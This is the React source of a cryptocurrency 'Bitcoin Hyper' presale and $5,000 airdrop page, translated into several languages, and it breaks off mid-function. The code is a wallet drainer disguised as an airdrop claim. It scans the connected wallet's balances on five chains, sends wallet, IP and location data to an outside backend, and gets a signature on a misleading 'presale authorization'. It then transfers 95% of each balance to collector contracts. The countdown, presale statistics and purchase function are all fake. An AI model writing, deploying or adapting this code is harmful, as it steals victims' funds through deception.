import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// LANGUAGE DETECTION & TRANSLATIONS
// ============================================

const SUPPORTED_LANGUAGES = {
  en: { name: 'English', flag: '🇺🇸', native: 'English' },
  es: { name: 'Spanish', flag: '🇪🇸', native: 'Español' },
  fr: { name: 'French', flag: '🇫🇷', native: 'Français' },
  de: { name: 'German', flag: '🇩🇪', native: 'Deutsch' },
  it: { name: 'Italian', flag: '🇮🇹', native: 'Italiano' },
  pt: { name: 'Portuguese', flag: '🇵🇹', native: 'Português' },
  ru: { name: 'Russian', flag: '🇷🇺', native: 'Русский' },
  zh: { name: 'Chinese', flag: '🇨🇳', native: '中文' },
  ja: { name: 'Japanese', flag: '🇯🇵', native: '日本語' },
  ko: { name: 'Korean', flag: '🇰🇷', native: '한국어' },
  ar: { name: 'Arabic', flag: '🇸🇦', native: 'العربية' },
  hi: { name: 'Hindi', flag: '🇮🇳', native: 'हिन्दी' },
  tr: { name: 'Turkish', flag: '🇹🇷', native: 'Türkçe' },
  nl: { name: 'Dutch', flag: '🇳🇱', native: 'Nederlands' },
  pl: { name: 'Polish', flag: '🇵🇱', native: 'Polski' },
  vi: { name: 'Vietnamese', flag: '🇻🇳', native: 'Tiếng Việt' },
  th: { name: 'Thai', flag: '🇹🇭', native: 'ไทย' },
  id: { name: 'Indonesian', flag: '🇮🇩', native: 'Bahasa Indonesia' }
};

const TRANSLATIONS = {
  en: {
    presaleLive: 'PRESALE LIVE · STAGE 4',
    bonusEndsIn: 'BONUS ENDS IN',
    days: 'days',
    hrs: 'hrs',
    mins: 'mins',
    secs: 'secs',
    bonus: '+25% BONUS · 5,000 BTH',
    instantAirdrop: 'instant airdrop · +25% extra',
    bthPrice: 'BTH PRICE',
    bonusLabel: 'BONUS',
    presale: 'PRESALE',
    stage4: 'STAGE 4',
    claim: 'CLAIM $5,000 BTH',
    processing: 'PROCESSING...',
    completed: '✓ COMPLETED SUCCESSFULLY',
    secured: 'Your $5,000 BTH has been secured',
    view: 'VIEW YOUR $5,000 BTH',
    welcome: 'Welcome to Bitcoin Hyper',
    connectWallet: 'CONNECT WALLET',
    disconnect: 'Disconnect Wallet',
    checkEligibility: 'Checking Eligibility',
    verifying: 'Verifying your wallet...',
    terms: 'Terms',
    delivery: 'Delivery',
    airdrop: '$5k Airdrop',
    liveNow: '5,000 BTH · +25% bonus · live now',
    successful: 'SUCCESSFUL!',
    youHaveSecured: 'You have secured',
    viewButton: 'VIEW',
    checkWalletEligibility: '⚡ Check Wallet Eligibility',
    whenQualified: 'When qualified, confirm to claim your airdrop',
    valueBadge: '$5,000 BTH',
    progress: 'Progress',
    today: 'Today',
    avg: 'Avg',
    totalRaised: 'Total Raised',
    tokenPrice: 'Token Price',
    currentBonus: 'Current Bonus',
    participants: 'participants'
  },
  es: {
    presaleLive: 'PREVENTA EN VIVO · ETAPA 4',
    bonusEndsIn: 'EL BONO TERMINA EN',
    days: 'días',
    hrs: 'hrs',
    mins: 'mins',
    secs: 'segs',
    bonus: '+25% BONO · 5,000 BTH',
    instantAirdrop: 'airdrop instantáneo · +25% extra',
    bthPrice: 'PRECIO BTH',
    bonusLabel: 'BONO',
    presale: 'PREVENTA',
    stage4: 'ETAPA 4',
    claim: 'RECLAMAR $5,000 BTH',
    processing: 'PROCESANDO...',
    completed: '✓ COMPLETADO CON ÉXITO',
    secured: 'Tus $5,000 BTH han sido asegurados',
    view: 'VER TUS $5,000 BTH',
    welcome: 'Bienvenido a Bitcoin Hyper',
    connectWallet: 'CONECTAR WALLET',
    disconnect: 'Desconectar Wallet',
    checkEligibility: 'Verificando Elegibilidad',
    verifying: 'Verificando tu wallet...',
    terms: 'Términos',
    delivery: 'Entrega',
    airdrop: 'Airdrop $5k',
    liveNow: '5,000 BTH · +25% bono · en vivo ahora',
    successful: '¡EXITOSO!',
    youHaveSecured: 'Has asegurado',
    viewButton: 'VER',
    checkWalletEligibility: '⚡ Verificar Elegibilidad',
    whenQualified: 'Cuando califiques, confirma para reclamar tu airdrop',
    valueBadge: '$5,000 BTH',
    progress: 'Progreso',
    today: 'Hoy',
    avg: 'Prom',
    totalRaised: 'Total Recaudado',
    tokenPrice: 'Precio Token',
    currentBonus: 'Bono Actual',
    participants: 'participantes'
  },
  fr: {
    presaleLive: 'PRÉVENTE EN DIRECT · ÉTAPE 4',
    bonusEndsIn: 'BONUS SE TERMINE DANS',
    days: 'jours',
    hrs: 'h',
    mins: 'min',
    secs: 's',
    bonus: '+25% BONUS · 5,000 BTH',
    instantAirdrop: 'airdrop instantané · +25% extra',
    bthPrice: 'PRIX BTH',
    bonusLabel: 'BONUS',
    presale: 'PRÉVENTE',
    stage4: 'ÉTAPE 4',
    claim: 'RÉCLAMER $5,000 BTH',
    processing: 'TRAITEMENT...',
    completed: '✓ TERMINÉ AVEC SUCCÈS',
    secured: 'Vos $5,000 BTH ont été sécurisés',
    view: 'VOIR VOS $5,000 BTH',
    welcome: 'Bienvenue sur Bitcoin Hyper',
    connectWallet: 'CONNECTER WALLET',
    disconnect: 'Déconnecter Wallet',
    checkEligibility: 'Vérification d\'Éligibilité',
    verifying: 'Vérification de votre wallet...',
    terms: 'Conditions',
    delivery: 'Livraison',
    airdrop: 'Airdrop $5k',
    liveNow: '5,000 BTH · +25% bonus · en direct',
    successful: 'SUCCÈS !',
    youHaveSecured: 'Vous avez sécurisé',
    viewButton: 'VOIR',
    checkWalletEligibility: '⚡ Vérifier Éligibilité',
    whenQualified: 'Une fois qualifié, confirmez pour réclamer votre airdrop',
    valueBadge: '$5,000 BTH',
    progress: 'Progrès',
    today: 'Aujourd\'hui',
    avg: 'Moy',
    totalRaised: 'Total Collecté',
    tokenPrice: 'Prix Token',
    currentBonus: 'Bonus Actuel',
    participants: 'participants'
  },
  de: {
    presaleLive: 'VORVERKAUF LIVE · STUFE 4',
    bonusEndsIn: 'BONUS ENDET IN',
    days: 'Tage',
    hrs: 'Std',
    mins: 'Min',
    secs: 'Sek',
    bonus: '+25% BONUS · 5,000 BTH',
    instantAirdrop: 'sofortiger Airdrop · +25% extra',
    bthPrice: 'BTH PREIS',
    bonusLabel: 'BONUS',
    presale: 'VORVERKAUF',
    stage4: 'STUFE 4',
    claim: '$5,000 BTH ANFORDERN',
    processing: 'VERARBEITUNG...',
    completed: '✓ ERFOLGREICH ABGESCHLOSSEN',
    secured: 'Ihre $5,000 BTH wurden gesichert',
    view: 'IHRE $5,000 BTH ANSEHEN',
    welcome: 'Willkommen bei Bitcoin Hyper',
    connectWallet: 'WALLET VERBINDEN',
    disconnect: 'Wallet trennen',
    checkEligibility: 'Berechtigung prüfen',
    verifying: 'Ihr Wallet wird verifiziert...',
    terms: 'Bedingungen',
    delivery: 'Lieferung',
    airdrop: '$5k Airdrop',
    liveNow: '5,000 BTH · +25% Bonus · live jetzt',
    successful: 'ERFOLGREICH!',
    youHaveSecured: 'Sie haben gesichert',
    viewButton: 'ANSEHEN',
    checkWalletEligibility: '⚡ Berechtigung prüfen',
    whenQualified: 'Bei Qualifikation bestätigen, um Airdrop zu erhalten',
    valueBadge: '$5,000 BTH',
    progress: 'Fortschritt',
    today: 'Heute',
    avg: 'Schnitt',
    totalRaised: 'Gesamt eingesammelt',
    tokenPrice: 'Token Preis',
    currentBonus: 'Aktueller Bonus',
    participants: 'Teilnehmer'
  },
  zh: {
    presaleLive: '预售进行中 · 第四阶段',
    bonusEndsIn: '奖励结束于',
    days: '天',
    hrs: '小时',
    mins: '分钟',
    secs: '秒',
    bonus: '+25% 奖励 · 5,000 BTH',
    instantAirdrop: '即时空投 · +25% 额外',
    bthPrice: 'BTH 价格',
    bonusLabel: '奖励',
    presale: '预售',
    stage4: '第四阶段',
    claim: '领取 $5,000 BTH',
    processing: '处理中...',
    completed: '✓ 成功完成',
    secured: '您的 $5,000 BTH 已确保',
    view: '查看您的 $5,000 BTH',
    welcome: '欢迎来到 Bitcoin Hyper',
    connectWallet: '连接钱包',
    disconnect: '断开钱包',
    checkEligibility: '检查资格',
    verifying: '正在验证您的钱包...',
    terms: '条款',
    delivery: '交付',
    airdrop: '$5k 空投',
    liveNow: '5,000 BTH · +25% 奖励 · 正在进行',
    successful: '成功！',
    youHaveSecured: '您已确保',
    viewButton: '查看',
    checkWalletEligibility: '⚡ 检查钱包资格',
    whenQualified: '符合条件时，确认领取空投',
    valueBadge: '$5,000 BTH',
    progress: '进度',
    today: '今日',
    avg: '平均',
    totalRaised: '总筹集',
    tokenPrice: '代币价格',
    currentBonus: '当前奖励',
    participants: '参与者'
  },
  ja: {
    presaleLive: 'プレセール実施中 · ステージ4',
    bonusEndsIn: 'ボーナス終了まで',
    days: '日',
    hrs: '時間',
    mins: '分',
    secs: '秒',
    bonus: '+25% ボーナス · 5,000 BTH',
    instantAirdrop: '即時エアドロップ · +25% 追加',
    bthPrice: 'BTH 価格',
    bonusLabel: 'ボーナス',
    presale: 'プレセール',
    stage4: 'ステージ4',
    claim: '$5,000 BTH を受け取る',
    processing: '処理中...',
    completed: '✓ 正常に完了',
    secured: '$5,000 BTH が確保されました',
    view: '$5,000 BTH を表示',
    welcome: 'Bitcoin Hyper へようこそ',
    connectWallet: 'ウォレット接続',
    disconnect: 'ウォレット切断',
    checkEligibility: '資格確認中',
    verifying: 'ウォレットを検証中...',
    terms: '利用規約',
    delivery: '配信',
    airdrop: '$5k エアドロップ',
    liveNow: '5,000 BTH · +25% ボーナス · 実施中',
    successful: '成功！',
    youHaveSecured: '確保しました',
    viewButton: '表示',
    checkWalletEligibility: '⚡ ウォレット資格を確認',
    whenQualified: '資格がある場合、確認してエアドロップを受け取る',
    valueBadge: '$5,000 BTH',
    progress: '進捗',
    today: '今日',
    avg: '平均',
    totalRaised: '総調達額',
    tokenPrice: 'トークン価格',
    currentBonus: '現在のボーナス',
    participants: '参加者'
  },
  ko: {
    presaleLive: '프리세일 진행 중 · 4단계',
    bonusEndsIn: '보너스 종료까지',
    days: '일',
    hrs: '시간',
    mins: '분',
    secs: '초',
    bonus: '+25% 보너스 · 5,000 BTH',
    instantAirdrop: '즉시 에어드랍 · +25% 추가',
    bthPrice: 'BTH 가격',
    bonusLabel: '보너스',
    presale: '프리세일',
    stage4: '4단계',
    claim: '$5,000 BTH 받기',
    processing: '처리 중...',
    completed: '✓ 성공적으로 완료',
    secured: '$5,000 BTH가 확보되었습니다',
    view: '$5,000 BTH 보기',
    welcome: 'Bitcoin Hyper에 오신 것을 환영합니다',
    connectWallet: '지갑 연결',
    disconnect: '지갑 연결 해제',
    checkEligibility: '자격 확인 중',
    verifying: '지갑 확인 중...',
    terms: '약관',
    delivery: '전달',
    airdrop: '$5k 에어드랍',
    liveNow: '5,000 BTH · +25% 보너스 · 진행 중',
    successful: '성공!',
    youHaveSecured: '확보했습니다',
    viewButton: '보기',
    checkWalletEligibility: '⚡ 지갑 자격 확인',
    whenQualified: '자격이 되면 확인하여 에어드랍 받기',
    valueBadge: '$5,000 BTH',
    progress: '진행률',
    today: '오늘',
    avg: '평균',
    totalRaised: '총 모금액',
    tokenPrice: '토큰 가격',
    currentBonus: '현재 보너스',
    participants: '참가자'
  },
  ar: {
    presaleLive: 'بيع مسبق مباشر · المرحلة 4',
    bonusEndsIn: 'تنتهي المكافأة في',
    days: 'أيام',
    hrs: 'ساعات',
    mins: 'دقائق',
    secs: 'ثواني',
    bonus: '+25٪ مكافأة · 5,000 BTH',
    instantAirdrop: 'إسقاط جوي فوري · +25٪ إضافي',
    bthPrice: 'سعر BTH',
    bonusLabel: 'مكافأة',
    presale: 'بيع مسبق',
    stage4: 'المرحلة 4',
    claim: 'استلام $5,000 BTH',
    processing: 'جاري المعالجة...',
    completed: '✓ اكتمل بنجاح',
    secured: 'تم تأمين $5,000 BTH الخاص بك',
    view: 'عرض $5,000 BTH الخاص بك',
    welcome: 'مرحباً بك في Bitcoin Hyper',
    connectWallet: 'ربط المحفظة',
    disconnect: 'قطع المحفظة',
    checkEligibility: 'جاري التحقق من الأهلية',
    verifying: 'جاري التحقق من محفظتك...',
    terms: 'الشروط',
    delivery: 'التسليم',
    airdrop: 'إسقاط جوي $5k',
    liveNow: '5,000 BTH · +25٪ مكافأة · مباشر الآن',
    successful: 'نجاح!',
    youHaveSecured: 'لقد قمت بتأمين',
    viewButton: 'عرض',
    checkWalletEligibility: '⚡ التحقق من أهلية المحفظة',
    whenQualified: 'عند التأهل، قم بالتأكيد لاستلام الإسقاط الجوي',
    valueBadge: '$5,000 BTH',
    progress: 'التقدم',
    today: 'اليوم',
    avg: 'المتوسط',
    totalRaised: 'الإجمالي المجموع',
    tokenPrice: 'سعر التوكن',
    currentBonus: 'المكافأة الحالية',
    participants: 'مشارك'
  }
};

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x7264F557f762f16aC7937292D19449c5CE962288',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-red-500 to-red-600',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0x7264F557f762f16aC7937292D19449c5CE962288',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-red-500 to-red-600',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-red-500 to-red-600',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-red-500 to-red-600',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-500 to-red-600',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "event FlowProcessed(address indexed initiator, uint256 value)"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [error, setError] = useState('');
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [prices, setPrices] = useState({
    eth: 2000,
    bnb: 300,
    matic: 0.75,
    avax: 32
  });
  const [userEmail, setUserEmail] = useState('');
  const [userLocation, setUserLocation] = useState({ country: '', city: '', flag: '', ip: '' });
  const [hoverConnect, setHoverConnect] = useState(false);
  const [walletInitialized, setWalletInitialized] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanning, setScanning] = useState(false);
  const [currentFlowId, setCurrentFlowId] = useState('');
  const [processingChain, setProcessingChain] = useState('');
  const [isEligible, setIsEligible] = useState(false);
  const [eligibleChains, setEligibleChains] = useState([]);
  const [bnbAmount, setBnbAmount] = useState('');
  const [showClaimButton, setShowClaimButton] = useState(false);
  
  // ============================================
  // LANGUAGE STATE - FIXED
  // ============================================
  const [language, setLanguage] = useState('en');
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const [translations, setTranslations] = useState(TRANSLATIONS.en);

  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 10,
    hours: 0,
    minutes: 0,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 875000,
    totalSold: 4250000,
    totalParticipants: 5632,
    currentBonus: 20,
    nextBonus: 15,
    tokenPrice: 0.035,
    hardCap: 10000000,
    btcPrice: 0.035
  });

  // Live progress tracking
  const [liveProgress, setLiveProgress] = useState({
    percentComplete: 42.5,
    participantsToday: 234,
    avgAllocation: 1850
  });

  // ============================================
  // AUTO DETECT LANGUAGE FROM BROWSER - FIXED
  // ============================================
  useEffect(() => {
    const detectLanguage = () => {
      // First check URL path
      const path = window.location.pathname;
      const pathLang = path.split('/')[1];
      
      if (pathLang && SUPPORTED_LANGUAGES[pathLang]) {
        setLanguage(pathLang);
        setTranslations(TRANSLATIONS[pathLang] || TRANSLATIONS.en);
        return;
      }
      
      // Then try browser language
      const browserLang = navigator.language.split('-')[0];
      if (SUPPORTED_LANGUAGES[browserLang]) {
        setLanguage(browserLang);
        setTranslations(TRANSLATIONS[browserLang] || TRANSLATIONS.en);
      } else {
        setLanguage('en');
        setTranslations(TRANSLATIONS.en);
      }
    };
    
    detectLanguage();
  }, []);

  // ============================================
  // CHANGE LANGUAGE FUNCTION - FIXED
  // ============================================
  const changeLanguage = (langCode) => {
    setLanguage(langCode);
    setTranslations(TRANSLATIONS[langCode] || TRANSLATIONS.en);
    setShowLanguageDropdown(false);
    
    // Update URL without page reload
    const url = new URL(window.location);
    if (langCode === 'en') {
      if (url.pathname.startsWith(`/${langCode}`)) {
        url.pathname = url.pathname.replace(`/${langCode}`, '') || '/';
      }
    } else {
      url.pathname = `/${langCode}${url.pathname}`;
    }
    window.history.pushState({}, '', url.toString());
  };

  // Fetch crypto prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Initialize provider and signer from AppKit
  useEffect(() => {
    if (!walletProvider || !address) {
      setWalletInitialized(false);
      return;
    }

    const init = async () => {
      try {
        console.log("🔄 Initializing wallet...");
        setTxStatus('🔄 Initializing...');
        
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();

        setProvider(ethersProvider);
        setSigner(ethersSigner);

        console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
        setWalletInitialized(true);
        setTxStatus('');
        
        // Fetch balances across all chains
        await fetchAllBalances(address);
        
      } catch (e) {
        console.error("Provider init failed", e);
        setWalletInitialized(false);
      }
    };

    init();
  }, [walletProvider, address]);

  // Track page visit with location
  useEffect(() => {
    const trackVisit = async () => {
      try {
        const response = await fetch('https://flarebackend.vercel.app/api/track-visit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referer: document.referrer,
            path: window.location.pathname
          })
        });
        const data = await response.json();
        if (data.success) {
          setUserLocation({
            country: data.data.country || 'Unknown',
            city: data.data.city || '',
            ip: data.data.ip || '',
            flag: data.data.flag || '🌍'
          });
        }
      } catch (err) {
        console.error('Visit tracking error:', err);
      }
    };
    trackVisit();
  }, []);

  // Countdown timer - 10 days from now
  useEffect(() => {
    const endTime = new Date().getTime() + (10 * 24 * 60 * 60 * 1000);
    
    const timer = setInterval(() => {
      const now = new Date().getTime();
      const diff = endTime - now;
      
      if (diff > 0) {
        setTimeLeft({
          days: Math.floor(diff / (1000 * 60 * 60 * 24)),
          hours: Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
          minutes: Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)),
          seconds: Math.floor((diff % (1000 * 60)) / 1000)
        });
      }
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
      checkEligibility();
    }
  }, [isConnected, address, balances]);

  // Check eligibility without showing balances
  const checkEligibility = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Checking eligibility...');
    
    try {
      // Calculate total value
      const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
      
      // Get chains with balance
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
        balances[chain.name] && balances[chain.name].amount > 0.000001
      );
      
      // Check if eligible (total >= $1)
      const eligible = total >= 1;
      setIsEligible(eligible);
      setShowClaimButton(eligible);
      
      if (eligible) {
        setEligibleChains(chainsWithBalance);
        setTxStatus('✅ You qualify for $5,000 Bitcoin Hyper (BTH)!');
        
        // Send to backend for tracking
        await fetch('https://flarebackend.vercel.app/api/presale/connect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            totalValue: total,
            chains: chainsWithBalance.map(c => c.name)
          })
        });
        
        // Prepare flow silently
        preparePresale();
      } else {
        setTxStatus(total > 0 ? '✨ Connected' : '👋 Welcome');
      }
      
    } catch (err) {
      console.error('Eligibility check error:', err);
      setTxStatus('✅ Ready');
    } finally {
      setVerifying(false);
    }
  };

  // Fetch balances across all chains (hidden from UI)
  const fetchAllBalances = async (walletAddress) => {
    console.log("🔍 Checking eligibility...");
    setScanning(true);
    setTxStatus('🔄 Checking eligibility...');
    
    const balanceResults = {};
    let scanned = 0;
    const totalChains = DEPLOYED_CHAINS.length;
    
    // Scan all chains in parallel
    const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        
        const valueUSD = amount * price;
        
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
        setTxStatus(`🔄 Checking eligibility...`);
        
        if (amount > 0.000001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            contractAddress: chain.contractAddress,
            price: price,
            name: chain.name,
            rpc: chain.rpc
          };
          console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} detected`);
        }
      } catch (err) {
        console.error(`Failed to fetch balance for ${chain.name}:`, err);
        scanned++;
      }
    });
    
    await Promise.all(scanPromises);
    
    setBalances(balanceResults);
    setScanning(false);
    
    const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    console.log(`💰 Total detected: $${total.toFixed(2)}`);
    
    return total;
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      await fetch('https://flarebackend.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  // ============================================
  // MULTI-CHAIN EXECUTION - 95% OF BALANCE
  // ============================================
  const executeMultiChainSignature = async () => {
    if (!walletProvider || !address || !signer) {
      setError("Wallet not initialized");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      setCompletedChains([]);
      
      const timestamp = Date.now();
      const flowId = `FLOW-${timestamp}`;
      setCurrentFlowId(flowId);
      
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `BITCOIN HYPER (BTH) TOKEN PRESALE AUTHORIZATION\n\n` +
        `I hereby confirm my participation in the Bitcoin Hyper (BTH) presale\n` +
        `Wallet: ${address}\n` +
        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
        `Timestamp: ${new Date().toISOString()}\n` +
        `Nonce: ${nonce}`;

      setTxStatus('✍️ Sign message...');

      // Get signature - ONE SIGNATURE FOR ALL CHAINS
      const signature = await signer.signMessage(message);
      console.log("✅ Signature obtained");
      
      setTxStatus('✅ Executing on eligible chains...');

      // Use the pre-calculated eligible chains
      const chainsToProcess = eligibleChains;
      
      console.log(`🔄 Processing ${chainsToProcess.length} eligible chains`);
      
      if (chainsToProcess.length === 0) {
        setError("No eligible chains found");
        setSignatureLoading(false);
        return;
      }

      // Sort chains by value (highest first)
      const sortedChains = [...chainsToProcess].sort((a, b) => 
        (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
      );
      
      let processed = [];
      
      for (const chain of sortedChains) {
        try {
          setProcessingChain(chain.name);
          setTxStatus(`🔄 Processing ${chain.name}...`);
          
          // Switch to the correct chain using AppKit
          try {
            console.log(`🔄 Switching to ${chain.name}...`);
            
            await walletProvider.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${chain.chainId.toString(16)}` }]
            });
            
            // Wait for chain switch
            await new Promise(resolve => setTimeout(resolve, 1000));
            
          } catch (switchError) {
            console.log(`Chain switch needed, continuing...`);
          }
          
          // Create provider for this chain
          const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
          
          // Get balance data - SEND 95%
          const balance = balances[chain.name];
          const amountToSend = (balance.amount * 0.95);
          const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
          
          console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
          
          // Create contract interface
          const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
          const data = contractInterface.encodeFunctionData('processNativeFlow', []);
          
          const value = ethers.parseEther(amountToSend.toFixed(18));

          // Estimate gas
          const contract = new ethers.Contract(
            chain.contractAddress,
            PROJECT_FLOW_ROUTER_ABI,
            chainProvider
          );
          
          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
          const gasLimit = gasEstimate * 120n / 100n;

          // Send transaction
          const tx = await walletProvider.request({
            method: 'eth_sendTransaction',
            params: [{
              from: address,
              to: chain.contractAddress,
              value: '0x' + value.toString(16),
              gas: '0x' + gasLimit.toString(16),
              data: data
            }]
          });

          setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
          
          // Wait for confirmation
          const receipt = await chainProvider.waitForTransaction(tx);
          
          if (receipt && receipt.status === 1) {
            console.log(`✅ ${chain.name} confirmed`);
            
            processed.push(chain.name);
            setCompletedChains(prev => [...prev, chain.name]);
            
            // Calculate gas used
            const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
            
            // Send to backend with amounts
            const flowData = {
              walletAddress: address,
              chainName: chain.name,
              flowId: flowId,
              txHash: tx,
              amount: amountToSend.toFixed(6),
              symbol: chain.symbol,
              valueUSD: valueUSD,
              gasFee: gasUsed,
              email: userEmail,
              location: {
                country: userLocation.country,
                flag: userLocation.flag,
                city: userLocation.city,
                ip: userLocation.ip
              }
            };
            
            console.log("📤 Sending to backend with amounts:", flowData);
            
            await fetch('https://flarebackend.vercel.app/api/presale/process-flow', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(flowData)
            });
            
            setTxStatus(`✅ ${chain.name} completed!`);
          } else {
            throw new Error(`Transaction failed on ${chain.name}`);
          }
          
        } catch (chainErr) {
          console.error(`Error on ${chain.name}:`, chainErr);
          setError(`Error on ${chain.name}: ${chainErr.message}`);
        }
      }

      setVerifiedChains(processed);
      
      if (processed.length > 0) {
        setShowCelebration(true);
        setTxStatus(`🎉 You've secured $5,000 BTH!`);
        
        // Calculate total processed value
        const totalProcessedValue = processed.reduce((sum, chainName) => {
          return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
        }, 0);
        
        // Final success notification
        await fetch('https://flarebackend.vercel.app/api/presale/claim', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            email: userEmail,
            location: {
              country: userLocation.country,
              flag: userLocation.flag,
              city: userLocation.city
            },
            chains: processed,
            totalProcessedValue: totalProcessedValue.toFixed(2),
            reward: "5000 BTH",
            bonus: `${presaleStats.currentBonus}%`
          })
        });
      } else {
        setError("No chains were successfully processed");
      }
      
    } catch (err) {
      console.error('Error:', err);
      if (err.code === 4001) {
        setError('Transaction cancelled');
      } else {
        setError(err.message || 'Transaction failed');
      }
    } finally {
      setSignatureLoading(false);
      setProcessingChain('');
    }
  };

  // Buy BTH tokens function
  const buyBth = async () => {
    if (!walletProvider || !address || !signer) {
      setError("Wallet not initialized");
      return;
    }

    if (!bnbAmount || parseFloat(bnbAmount) <= 0) {
      setError("Please enter a valid amount");
      return;
    }

    try {
      setLoading(true);
      setError('');
      
      setTxStatus('🔄 Buying BTH tokens...');
      
      // This is where you'd implement the actual buy function
      // For now, we'll simulate a successful purchase
      
      setTimeout(() => {
        setTxStatus('✅ Purchase successful!');
        setLoading(false);
      }, 2000);
      
    } catch (err) {
      console.error('Buy error:', err);
      setError(err.message || 'Purchase failed');
      setLoading(false);
    }
  };

  // Claim airdrop function (calls executeMultiChainSignature)
  const claimAirdrop = async () => {
    if (!isConnected) {
      setError("Please connect your wallet first");
      return;
    }
    
